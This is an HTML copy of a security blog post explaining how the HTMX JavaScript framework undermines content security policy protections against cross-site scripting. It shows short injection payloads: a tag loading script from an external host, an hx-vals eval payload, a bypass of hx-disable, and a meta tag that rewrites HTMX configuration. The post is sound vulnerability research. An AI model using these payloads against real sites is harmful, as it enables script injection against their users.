<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.sjoerdlangkemper.nl/2024/06/26/htmx-content-security-policy/">Original</a>
    <h1>Htmx does not play well with content security policy</h1>
    
    <div id="readability-page-1" class="page"><div>
      <div>
        <div>
          <article>

  

  <div>
  <p>HTMX is a JavaScript framework that makes it possible to replace DOM elements with dynamic data from AJAX requests, specified by HTML attributes. Because dynamic behavior is added to the page using normal HTML tags with custom attributes, it is difficult to provide additional security against cross-site scripting (XSS) attacks.</p>

<!-- Photo source: https://pixabay.com/photos/blue-gate-english-countryside-1725791/ -->

<h2 id="introduction">Introduction</h2>

<p>Normally, a content security policy (CSP) can be used to limit which JavaScript is executed. It is difficult to configure a CSP where HTMX keeps working and is also protected against cross-site scripting.</p>

<h2 id="loading-malicious-fragments">Loading malicious fragments</h2>

<p>An obvious HTMX injection method is to perform a request to a malicious host. HTMX retrieves a HTML fragment, possibly containing JavaScript, and places it on the page. By triggering a request to domain other than the web application’s, this can be used to load malicious script.</p>

<p>For example, the following tag loads and executes JavaScript that shows an alert:</p>

<div><div><pre><code>&lt;div hx-get=&#34;https://test.sjoerdlangkemper.nl/cors.php&#34; hx-trigger=&#34;load&#34;&gt;&lt;/div&gt;
</code></pre></div></div>

<p>That <code>cors.php</code> file contains the JavaScript payload, and also sets CORS headers so that the browser has access to it.</p>

<p><a href="https://demo.sjoerdlangkemper.nl/htmx/connect.php?name=hacker">Try it</a></p>

<h2 id="unsafe-eval">Unsafe eval</h2>

<p>HTMX dynamically creates and executes code. There are several HTMX <a href="https://htmx.org/docs/#configuration-options">features</a> that do this:</p>

<ul>
  <li><a href="https://htmx.org/docs/#trigger-filters">trigger filters</a></li>
  <li><a href="https://htmx.org/docs/#hx-on"><em>hx-on</em> attributes</a></li>
  <li><em>hx-vals</em> or <em>hx-headers</em> with the <code>js:</code> or <code>javascript:</code> prefix</li>
</ul>

<p>For these to work, the application has to allow evaluating dynamic code, using the CSP option <code>unsafe-eval</code>. However, allowing <code>unsafe-eval</code> immediately makes it possible to inject JavaScript using HTMX functionality.</p>

<p>For example, injecting the following tag shows an alert popup:</p>

<div><div><pre><code>&lt;div hx-vals=&#39;js:&#34;a&#34;:alert(`XSS`)&#39; hx-get=&#34;/&#34; hx-trigger=&#39;load&#39;&gt;foo&lt;/div&gt;
</code></pre></div></div>

<p><a href="https://demo.sjoerdlangkemper.nl/htmx/eval.php?name=hacker">Try it</a></p>

<h2 id="disabling-htmx-with-hx-disable">Disabling HTMX with <em>hx-disable</em></h2>

<p>It’s possible to disable HTMX functionality in part of the page with the <a href="https://htmx.org/docs/#hx-disable"><em>hx-disable</em> attribute</a>. The docs claim this can bring additional security:</p>

<div><div><pre><code>&lt;div hx-disable&gt;
    &lt;%= raw(user_content) %&gt;
&lt;/div&gt;
</code></pre></div></div>

<blockquote>
  <p>And htmx will not process any htmx-related attributes or features found in that content. This attribute cannot be disabled by injecting further content: if an hx-disable attribute is found anywhere in the parent hierarchy of an element, it will not be processed by htmx.</p>
</blockquote>

<p>Of course, this is trivial to bypass: just close the div tag with <code>&lt;/div&gt;</code> and insert your payload outside of the element with the <em>hx-disable</em> attribute.</p>

<p><a href="https://demo.sjoerdlangkemper.nl/htmx/disable.php?name=hacker">Try it</a></p>

<h2 id="nonces-for-inline-scripts">Nonces for inline scripts</h2>

<p>Using a nonce in the CSP is the most secure way to prevent script injection. The application generates a random nonce and adds that to all scripts that are part of the application. Scripts injected by the attacker don’t have the correct nonce and are not executed.</p>

<p>HTMX has functionality that automatically adds the correct nonce to inline scripts it retrieves. This is convenient, but totally breaks the security model of CSP with nonces. By adding the correct nonce to any script it finds, HTMX totally compromises the security offered by nonces.</p>

<p>Automatically adding nonces is done through the <a href="https://htmx.org/docs/#config">parameter</a> <code>htmx.config.inlineScriptNonce</code>.</p>

<p><a href="https://demo.sjoerdlangkemper.nl/htmx/nonce.php?name=hacker">Try it</a></p>



<p>HTMX has several configuration options, which can be configured using a <code>&lt;meta&gt;</code> tag. In an XSS attack, this makes it possible to modify HTMX’s configuration by injecting the correct <code>&lt;meta&gt;</code> tag.</p>

<p>For example, above we mentioned that the <code>hx-disable</code> attribute disabled HTMX processing. However, it is possible to rename that attribute in the configuration. By setting it from <code>hx-disable</code> to something else, the <code>hx-disable</code> functionality can be disabled. This can be achieved by injecting the following tag:</p>

<div><div><pre><code>&lt;meta name=&#34;htmx-config&#34; content=&#39;{&#34;disableSelector&#34;:&#34;something&#34;}&#39;&gt;
</code></pre></div></div>

<p>This even works within a tag with <em>hx-disable</em>, but only if there is no similar meta tag above it.</p>

<p><a href="https://demo.sjoerdlangkemper.nl/htmx/disable.php?name=hacker">Try it</a></p>

<h2 id="conclusion">Conclusion</h2>

<p>When a site uses HTMX, the attack surface of HTML injection greatly increases. It is possible to limit the risk of XSS by using a content security policy, but it not possible to have all HTMX features and provide security against injection.</p>

  </div>

</article>

        </div>
      </div>
    </div></div>
  </body>
</html>
